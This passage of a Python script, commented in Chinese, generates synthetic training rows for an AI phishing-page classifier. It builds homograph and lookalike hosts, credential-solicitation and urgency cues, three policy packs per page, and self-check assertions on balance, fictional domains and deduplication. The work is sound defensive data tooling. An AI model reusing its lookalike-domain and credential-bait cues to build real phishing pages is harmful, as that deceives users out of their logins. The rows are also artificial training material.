        rest = [c for c in STRUCT_CUES if c not in struct]
        struct |= set(rng.sample(rest, k))
        prag = {"cred-solicit"}
        prag |= set(rng.sample(list(HARD_PRAG_POOL), rng.choice((1, 2))))
        cues = struct | prag
    else:
        cues = set(rng.sample(list(SOFT_STRUCT_POOL), 1))
        cues |= set(rng.sample(list(SOFT_PRAG_POOL), rng.choice((1, 2))))
    official = brand["host"]
    if "homograph" in cues:
        host = _homograph(official)
    elif attack:
        host = f"{d}-{tag}.{HOSTING_ZONE}"
    else:
        host = official
    ctx = dict(
        i=i, token="%04d%06x" % (i, rng.randrange(16 ** 6)),
        code="%06x" % rng.randrange(16 ** 6),
        num="%08d" % rng.randrange(10 ** 8),
        ip=rng.randint(2, 250), amt="%d.%02d" % (rng.randint(100, 9999),
                                                 rng.randint(0, 99)),
        app=rng.choice(APPS),
        host=host, official=official,
        zw_official=_zw(official),
        evil=f"{tag2}-{d}.{zone}",
        brand_zh=brand["zh"], brand_en=brand["en"],
        cues=cues,
        hidden_note=rng.choice(HIDDEN_NOTES[lang]),
        authority_copy=rng.choice(AUTHORITY_COPY[lang]),
        urgency_copy=rng.choice(URGENCY_COPY[carrier][lang]).format(
            h=rng.choice((2, 6, 24)), m=rng.choice((3, 5, 10))),
        promo_copy=rng.choice(PROMO_COPY[lang]).format(
            m=rng.choice((15, 30, 59))),
        lang=lang, carrier=carrier, cat=cat,
    )
    return ctx


def _user_text(x, lang, carrier):
    """同一页面：三包共用同一 user 文本（政策条件化配对）。"""
    attack = x["cat"] in ("hard", "soft")
    redirects = 3 if "redirect-chain" in x["cues"] else 0
    path = PAGE_PATH[carrier]
    cb = serialize_webpage(
        "\n".join(x["html"]),
        url=f"https://{x['host']}/{path}?ref={x['token']}",
        fetched="2026-10-06T%02d:%02d:%02dZ" % (x["i"] % 24,
                                                (x["i"] * 7) % 60,
                                                (x["i"] * 13) % 60),
        redirects=redirects, cid="c1")
    task = TASKS[carrier][lang][x["i"] % 2]
    # 信封内 policy 固定为 default（沿 gen_sft_v0._make_user / t14 先例）：
    # 保证「同一页面三包」的 user 文本逐字相同，政策梯度只由 system 区与
    # 行的 pack 字段承载。
    return build_context(
        role="security_analyst", authorization=AUTH[lang],
        policy="default", output_mode="structured",
        operator=OP_PREFIX[lang] + task,
        carriers=[cb], user=TAIL[lang]), attack


def _evidence(x, lang):
    keys = [k for k in EVIDENCE_ORDER if k in x["cues"]]
    parts = []
    for k in keys:
        src = STRUCT_CUES.get(k) or PRAG_CUES[k]
        parts.append(src[lang])
    return ("；".join(parts) if lang == "zh" else "; ".join(parts)), keys


def _task_name(x, carrier):
    if x["cat"] == "clean-login":
        return f"T9-phish:{carrier}:benign-control"
    if x["cat"] == "clean-marketing":
        return f"T9-phish:{carrier}:hardneg-control"
    keys = [k for k in EVIDENCE_ORDER if k in x["cues"]]
    return f"T9-phish:{carrier}:{keys[0]}:{VERDICT_BY_CAT[x['cat']]}"


# ============================================================ 生成主体 ====
def generate(n: int, seed: int = SEED_DEFAULT, shuffle: bool = True
             ) -> tuple[list[dict], dict]:
    """生成 n 行（每页 3 包），返回 (rows, meta)。"""
    rng = random.Random(seed)
    n_inst = (n + 2) // 3
    rows, triples = [], []
    for i in range(n_inst):
        cat = CAT_PATTERN[i % len(CAT_PATTERN)]
        carrier = CARRIERS[(i // 2) % len(CARRIERS)]
        lang = "zh" if i % 2 == 0 else "en"
        brand = BRANDS[i % len(BRANDS)]
        x = _instance_ctx(rng, i, carrier, cat, lang, brand)
        html, struct, prag, hardneg = _page_html(x, carrier, lang, cat)
        x.update(html=html, struct=struct, prag=prag, hardneg=hardneg)
        triple = []
        for pack in PACKS:
            x["pack"] = pack
            user, _attack = _user_text(x, lang, carrier)
            ev, keys = _evidence(x, lang)
            if cat in ("hard", "soft"):
                reply = REPLY[cat][pack][lang].format(ev=ev)
                findings = keys
            else:
                reply = CLEAN_REPLY[pack][lang].format(
                    desc=CLEAN_DESC[cat][lang])
                findings = []
            assistant = reply + "\n" + verdict_line(
                ACTION_BY_PACK[cat][pack], VERDICT_BY_CAT[cat],
                CONFIDENCE[cat], findings, pack)
            triple.append((x, pack, user, assistant))
        rows.extend(triple)
        triples.append(triple)
    rows = rows[:n]
    meta = {"instances": n_inst, "seed": seed}
    triple_rows = [[(x, p, u, a) for (x, p, u, a) in t] for t in triples]
    if shuffle:
        rng2 = random.Random(seed ^ 0x5EED)
        rng2.shuffle(rows)
    out = []
    for k, (x, pack, user, assistant) in enumerate(rows):
        out.append({
            "_x": {"cat": x["cat"], "carrier": x["carrier"], "lang": x["lang"],
                   "cues": sorted(x["cues"]), "hardneg": sorted(x["hardneg"]),
                   "instance": x["i"], "action": ACTION_BY_PACK[x["cat"]][pack],
                   "verdict": VERDICT_BY_CAT[x["cat"]]},
            "row": build_sample(
                f"{ID_PREFIX}-{k + 1:04d}", _task_name(x, x["carrier"]), pack,
                x["lang"], user, assistant)})
    meta["triples"] = triple_rows
    meta["total_before_truncate"] = n_inst * 3
    return out, meta


# ============================================================ 断言/统计 ===
def _iter_jsonl(path: Path):
    with open(path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line:
                yield json.loads(line)


def dedup_key(row: dict) -> str:
    """去重键：md5(pack + NUL + user)（沿父任务口径）。"""
    return hashlib.md5(
        (row["pack"] + "\x00" + row["messages"][1]["content"]).encode("utf-8")
    ).hexdigest()


def collect_baseline_keys(include_mix: bool = True):
    """既有 T9 行去重基线：v0x/t9_phish.jsonl + staging/t9_phishing.jsonl
    （= 混料中 96 行 T9 的生成源；混料流式扫描仅取 T9-phish 行做交叉核对）。"""
    keys = {}
    src_rows = {}
    for p in T9_SOURCES:
        if not p.exists():
            continue
        n = 0
        for row in _iter_jsonl(p):
            keys[dedup_key(row)] = row.get("id", "?")
            n += 1
        src_rows[p.name] = n
    mix = {"mix_t9_rows": 0, "mix_unique_keys": 0, "mix_keys_in_sources": 0,
           "mix_file": MIX_FILE.name, "scanned": False}
    if include_mix and MIX_FILE.exists():
        seen = set()
        for line in open(MIX_FILE, encoding="utf-8"):
            if '"task": "T9-phish' not in line:
                continue
            row = json.loads(line)
            seen.add(dedup_key(row))
            mix["mix_t9_rows"] += 1
        mix["mix_unique_keys"] = len(seen)
        mix["mix_keys_in_sources"] = len(seen & set(keys))
        mix["scanned"] = True
        for k in seen:
            keys.setdefault(k, "mix")
    return keys, {"source_rows": src_rows, "mix": mix,
                  "baseline_keys": len(keys)}


def _dist(rows, fn):
    out = {}
    for r in rows:
        k = str(fn(r))
        out[k] = out.get(k, 0) + 1
    return dict(sorted(out.items()))


def _dist_instances(rows):
    """按实例去重（每实例 3 包）统计维度分布。"""
    seen, out = set(), {}
    for r in rows:
        x = r["_x"]
        if x["instance"] in seen:
            continue
        seen.add(x["instance"])
        out[x["instance"]] = x
    return out


def run_assertions(payload: list[dict], meta: dict, baseline_keys: dict,
                   baseline_meta: dict) -> dict:
    """生成后自检（任一失败抛 AssertionError；结果同时进 stats）。"""
    rows = [p["row"] for p in payload]
    n = len(rows)
    res = {}
    ids, pack_users = set(), set()
    n_cjk_ok = n_en_ok = n_sys_ok = n_verdict = 0
    by_pack, by_lang, by_action, by_verdict = {}, {}, {}, {}
    for r in rows:
        assert set(r) == {"id", "task", "pack", "lang", "messages"}, r["id"]
        assert r["id"] not in ids, f"重复 id {r['id']}"
        ids.add(r["id"])
        assert r["pack"] in PACKS, r["id"]
        assert r["lang"] in ("zh", "en"), r["id"]
        assert r["task"].startswith("T9-phish:"), r["id"]
        msgs = r["messages"]
        assert [m["role"] for m in msgs] == ["system", "user", "assistant"], \
            r["id"]
        assert msgs[0]["content"] == POLICY_SYSTEM[r["pack"]][r["lang"]], \
            f"{r['id']}: system 非 POLICY_SYSTEM[{r['pack']}][{r['lang']}]"
        n_sys_ok += 1
        user, asst = msgs[1]["content"], msgs[2]["content"]
        assert "<dsh-protocol" in user and '<carrier type="webpage"' in user, \
            f"{r['id']}: 非协议信封/非 webpage 载体"
        assert "VERDICT: " in asst, f"{r['id']}: 缺 VERDICT"
        v = json.loads(asst.rsplit("VERDICT: ", 1)[1])
        n_verdict += 1
        assert v["policy"] == r["pack"], f"{r['id']}: policy≠pack"
        assert v["action"] in ("answer", "refuse", "report"), r["id"]
        assert isinstance(v["findings"], list), r["id"]
        if r["lang"] == "zh":
            assert len(_CJK.findall(user)) >= 10, f"{r['id']}: zh user 中文不足"
            n_cjk_ok += 1
        else:
            assert not _CJK.search(user), f"{r['id']}: en user 含中文"
            assert not _CJK.search(asst), f"{r['id']}: en assistant 含中文"
            n_en_ok += 1
        key = (r["pack"], user)
        assert key not in pack_users, f"{r['id']}: (pack,user) 重复"
        pack_users.add(key)
        by_pack[r["pack"]] = by_pack.get(r["pack"], 0) + 1
        by_lang[r["lang"]] = by_lang.get(r["lang"], 0) + 1
        by_action[v["action"]] = by_action.get(v["action"], 0) + 1
        by_verdict[str(v["verdict"])] = by_verdict.get(str(v["verdict"]), 0) + 1
    res["schema_ok"] = True
    res["system_policy_exact"] = f"{n_sys_ok}/{n}"
    res["verdict_coverage"] = round(n_verdict / n, 4)
    assert res["verdict_coverage"] == 1.0, "VERDICT 覆盖 != 100%"
    # 三档同页配对：同一 user 恰好 3 个 pack
    triples = {}
    for r in rows:
        triples.setdefault(r["messages"][1]["content"], []).append(r)
    complete = [t for t in triples.values() if len(t) == 3
                and {r["pack"] for r in t} == set(PACKS)]
    res["triples_total"] = len(triples)
    res["triples_complete"] = len(complete)
    # 动作差异率（同一页面三包；负例刻意同动作，见 docstring）
    user_cat = {r["messages"][1]["content"]: p["_x"]["cat"]
                for p in payload for r in [p["row"]]}
    diff_all = diff_attack = atk_triples = 0
    for t in complete:
        acts = {json.loads(r["messages"][2]["content"].rsplit(
            "VERDICT: ", 1)[1])["action"] for r in t}
        if len(acts) >= 2:
            diff_all += 1
        cat = user_cat.get(t[0]["messages"][1]["content"])
        if cat in ("hard", "soft"):
            atk_triples += 1
            if len(acts) >= 2:
                diff_attack += 1
    res["pack_action_diff_rate_all"] = round(diff_all / max(1, len(complete)), 4)
    res["pack_action_diff_rate_attack"] = round(
        diff_attack / max(1, atk_triples), 4)
    assert res["pack_action_diff_rate_all"] >= DIFF_MIN_ALL, \
        f"三档差异率 {res['pack_action_diff_rate_all']} < {DIFF_MIN_ALL}"
    assert res["pack_action_diff_rate_attack"] >= DIFF_MIN_ATTACK, \
        f"攻击页三档差异率 {res['pack_action_diff_rate_attack']} " \
        f"< {DIFF_MIN_ATTACK}"
    # 负例占比（按行计；负例 = clean-login / clean-marketing）
    inst = _dist_instances(payload)
    neg_rows = sum(1 for p in payload if p["_x"]["cat"].startswith("clean-"))
    res["negative_rows"] = neg_rows
    res["negative_ratio"] = round(neg_rows / n, 4)
    assert res["negative_ratio"] >= NEG_MIN_RATIO, \
        f"负例占比 {res['negative_ratio']} < {NEG_MIN_RATIO}"
    # 语言/包配比
    res["lang_gap"] = abs(by_lang.get("zh", 0) - by_lang.get("en", 0))
    assert res["lang_gap"] <= 3, f"zh/en 不均衡 {by_lang}"
    for p in PACKS:
        assert abs(by_pack.get(p, 0) - n / 3) <= 1, f"{p} 配比异常 {by_pack}"
    # 域名虚构性（示例域白名单 + 已知真实品牌 token 零命中）
    hosts = set()
    for r in rows:
        for m in re.findall(r"https?://([^/\s\"'<>\]]+)", r["messages"][1]["content"]):
            hosts.add(m.lower().rstrip(".,;"))
    bad = []
    for h in hosts:
        folded = h.translate(str.maketrans({"\u0430": "a", "\u0441": "c",
                                            "\u043e": "o", "\u0435": "e",
                                            "\u0440": "p", "\u0445": "x"}))
        if not any(folded == s or folded.endswith("." + s)
                   for s in ALLOWED_HOST_SUFFIXES):
            bad.append(h)
        elif domain_lookalike_note(h):
            bad.append(h)
    res["hosts_seen"] = len(hosts)
    res["non_fictional_hosts"] = bad
    assert not bad, f"非虚构/真实机构域名: {bad[:5]}"
    # 去重：与既有 T9 行（含混料 96 行）零重复
    dups = [r["id"] for r in rows if dedup_key(r) in baseline_keys]
    res["dups_vs_baseline"] = len(dups)
    assert not dups, f"与原 T9 行重复: {dups[:5]}"
    res["dedup"] = {**baseline_meta, "dups": len(dups),
                    "baseline_rows_total": len(baseline_keys)}
    res["by_pack"] = by_pack
    res["by_lang"] = by_lang
    res["by_action"] = by_action
    res["by_verdict"] = by_verdict
    # 维度分布（按页面实例去重；每实例 3 行）
    res["carrier_types"] = _dist(list(inst.values()), lambda v: v["carrier"])
    res["categories"] = _dist(list(inst.values()), lambda v: v["cat"])
    struct_c, prag_c, hn_c = {}, {}, {}
    for v in inst.values():
        for k in v["cues"]:
            tgt = struct_c if k in STRUCT_CUES else prag_c
            tgt[k] = tgt.get(k, 0) + 1
        for k in v["hardneg"]:
            hn_c[k] = hn_c.get(k, 0) + 1
    res["structural_cues"] = dict(sorted(struct_c.items()))
    res["pragmatic_cues"] = dict(sorted(prag_c.items()))
    res["hardneg_features"] = dict(sorted(hn_c.items()))
    res["rows"] = n
    res["instances"] = len(inst)
    res["sha256"] = hashlib.sha256(
        "".join(json.dumps(p["row"], ensure_ascii=False, sort_keys=True)
                for p in payload).encode("utf-8")).hexdigest()
    return res


# ============================================================ 报告打印 ====
def _fmt_dist(d, total=None):
    items = ", ".join(f"{k}={v}" for k, v in sorted(d.items()))
    return items + (f"  (合计 {total})" if total is not None else "")


def print_report(stats: dict) -> None:
    a = stats["assertions"]
    print("=" * 78)
    print("T9-phish 扩容生成器 —— 分布与自检")
    print("=" * 78)
    print(f"行数 {stats['rows']}（页面实例 {stats['instances']}，"
          f"每页 3 包；seed={stats['seed']}）")
    print(f"by_lang   : {_fmt_dist(a['by_lang'], stats['rows'])}")
    print(f"by_pack   : {_fmt_dist(a['by_pack'], stats['rows'])}")
    print(f"by_action : {_fmt_dist(a['by_action'], stats['rows'])}")
    print(f"by_verdict: {_fmt_dist(a['by_verdict'], stats['rows'])}")
    print(f"[④负例]   占比 {a['negative_ratio']:.2%}（阈值 ≥30%）"
          f"  分档 {_fmt_dist(a['categories'])}")
    print(f"[③载体类型] {_fmt_dist(a['carrier_types'])}")
    print(f"[①结构层线索] {_fmt_dist(a['structural_cues'])}")
    print(f"[②语用层线索] {_fmt_dist(a['pragmatic_cues'])}")
    print(f"[硬负例特征]  {_fmt_dist(a['hardneg_features'])}")
    print(f"三档动作差异率：整体 {a['pack_action_diff_rate_all']:.2%}"
          f"（阈值 ≥55%） | 攻击页 {a['pack_action_diff_rate_attack']:.2%}"
          f"（阈值 ≥95%）")
    print(f"VERDICT 覆盖 {a['verdict_coverage']:.0%}；"
          f"system==POLICY_SYSTEM {a['system_policy_exact']}；"
          f"虚构域名 {a['hosts_seen']} 个，越界 {len(a['non_fictional_hosts'])}")
    d = a["dedup"]
    print(f"去重基线：源文件行数 {d['source_rows']}，基线键 {d['baseline_keys']}，"
          f"混料 T9-phish 行 {d['mix']['mix_t9_rows']}"
          f"（唯一键 {d['mix']['mix_unique_keys']}，"
          f"落在源文件内的 {d['mix']['mix_keys_in_sources']}）"
          f"→ 本批重复 {d['dups']}")
    print(f"payload sha256: {a['sha256'][:32]}…")


# ============================================================ CLI =========
def write_rows(path: Path, payload: list[dict]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        for p in payload:
            f.write(json.dumps(p["row"], ensure_ascii=False) + "\n")


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="T9-phish 扩容生成器（CPU-only）")
    ap.add_argument("--out", default=str(OUT_DIR_DEFAULT),
                    help="输出目录（默认 data/sft/m2.5-staging）")
    ap.add_argument("--n", type=int, default=1500, help="总行数（默认 1500）")
    ap.add_argument("--seed", type=int, default=SEED_DEFAULT)
    ap.add_argument("--stats", default=str(STATS_DEFAULT))
    ap.add_argument("--no-mix-baseline", action="store_true",
                    help="跳过对 data/lf/sft_m25.jsonl 的 T9 行交叉核对")
    ap.add_argument("--no-shuffle", action="store_true")
    args = ap.parse_args(argv)
    if args.n <= 0:
        raise SystemExit("--n 必须为正整数")

    payload, meta = generate(args.n, args.seed, shuffle=not args.no_shuffle)
    baseline_keys, baseline_meta = collect_baseline_keys(
        include_mix=not args.no_mix_baseline)
    stats = {
        "generator": "scripts/gen_t9_phish_expand.py",
        "family": "T9-phish",
        "seed": args.seed, "n_requested": args.n,
        "out": str(Path(args.out) / FILE_NAME),
        "n_partial_triple": meta["total_before_truncate"] != args.n,
        "coverage_dimensions": {
            "structural": list(STRUCT_CUES), "pragmatic": list(PRAG_CUES),
            "carriers": list(CARRIERS),
            "negatives": ["clean-login", "clean-marketing"]},
        "pack_gradient": ACTION_BY_PACK,
        "rows": len(payload), "instances": meta["instances"],
    }
    stats["assertions"] = run_assertions(payload, meta, baseline_keys,
                                         baseline_meta)
    out_path = Path(args.out) / FILE_NAME
    write_rows(out_path, payload)
    stats_path = Path(args.stats)
    stats_path.parent.mkdir(parents=True, exist_ok=True)
    stats_path.write_text(json.dumps(stats, ensure_ascii=False, indent=2),
                          encoding="utf-8")
    print_report(stats)
    print(f"-> {out_path}")
    print(f"-> {stats_path}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
